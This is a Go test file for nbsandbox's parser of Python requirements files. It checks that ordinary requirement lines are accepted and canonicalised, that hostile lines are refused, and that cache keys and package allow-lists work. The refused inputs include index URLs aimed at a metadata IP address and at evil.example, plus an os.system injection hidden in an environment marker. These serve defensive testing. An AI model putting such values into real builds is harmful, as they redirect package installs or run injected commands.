// Copyright 2026 The nbsandbox Authors
// SPDX-License-Identifier: Apache-2.0

package packages

import (
	"errors"
	"strings"
	"testing"
)

func TestParseAcceptsPlainRequirements(t *testing.T) {
	h := strings.Repeat("ab", 32)
	rs, err := Parse([]byte(`# comment
requests==2.32.3
Scikit_Learn >=1.5, <2   # trailing comment
rich[jupyter] ~= 13.9 ; python_version >= "3.12"
tqdm \
    --hash=sha256:` + h + `

PyYAML
`))
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(rs.Names(), ","); got != "requests,scikit-learn,rich,tqdm,pyyaml" {
		t.Fatalf("names: %s", got)
	}
	if rs[3].Line != "tqdm" || len(rs[3].Hashes) != 1 || rs[3].Hashes[0] != "sha256:"+h {
		t.Errorf("hashed line: %+v", rs[3])
	}
	// The same requirements in another order and spacing: the same text.
	again, _ := Parse([]byte("PyYAML\ntqdm --hash=sha256:" + h + "\nrich[jupyter] ~= 13.9 ; python_version >= \"3.12\"\nScikit_Learn >=1.5, <2\nrequests==2.32.3\n"))
	if again.Canonical() != rs.Canonical() {
		t.Errorf("canonical differs:\n%s\n%s", again.Canonical(), rs.Canonical())
	}
	if empty, err := Parse([]byte("\n# nothing\n")); err != nil || len(empty) != 0 {
		t.Errorf("empty: %v %v", empty, err)
	}
}

// Nothing that could point the build somewhere else, or read a file.
func TestParseRefuses(t *testing.T) {
	for _, line := range []string{
		"-i http://169.254.169.254/simple",
		"--index-url https://evil.example/simple",
		"--extra-index-url https://evil.example/simple",
		"-f https://evil.example/wheels",
		"--find-links /etc",
		"-e git+https://github.com/x/y",
		"-r other.txt",
		"-c constraints.txt",
		"--trusted-host evil.example",
		"--pre",
		"requests @ https://evil.example/requests.whl",
		"https://evil.example/pkg.whl",
		"./local/pkg",
		"/abs/pkg.tar.gz",
		"pkg==1.0 --hash=md5:abc",
		"pkg==1.0 --hash=sha256:short",
		"pkg==1.0 --global-option=x",
		"git+https://github.com/x/y",
		"requests\nrequests==2",
		"pkg ; python_version >= '3' and os.system('x')",
		"tqdm \\",
	} {
		_, err := Parse([]byte(line + "\n"))
		var pe *ParseError
		if !errors.As(err, &pe) {
			t.Errorf("%q: accepted (%v)", line, err)
		}
	}
	if _, err := Parse([]byte(strings.Repeat("a", MaxRequirementsBytes+1))); err == nil {
		t.Error("too large")
	}
	var many strings.Builder
	for i := range MaxRequirementLines + 1 {
		many.WriteString("p" + strings.Repeat("x", i%5) + string(rune('a'+i%26)) + string(rune('a'+i/26)) + "\n")
	}
	if _, err := Parse([]byte(many.String())); err == nil {
		t.Error("too many lines")
	}
}

func TestKeyAndAllowed(t *testing.T) {
	k := Key("requests\n", "sha256:img", "linux/amd64")
	if len(k) != 64 || k == Key("requests\n", "sha256:other", "linux/amd64") || k == Key("requests\n", "sha256:img", "linux/arm64") ||
		k != Key("requests\n", "sha256:img", "linux/amd64") {
		t.Error("key depends on requirements, image and platform, and only them")
	}
	if got := Allowed([]string{"requests", "evil-pkg"}, []string{"Requests", "numpy"}); len(got) != 1 || got[0] != "evil-pkg" {
		t.Errorf("allowed: %v", got)
	}
	if got := Allowed([]string{"anything"}, nil); got != nil {
		t.Errorf("empty list allows all: %v", got)
	}
}
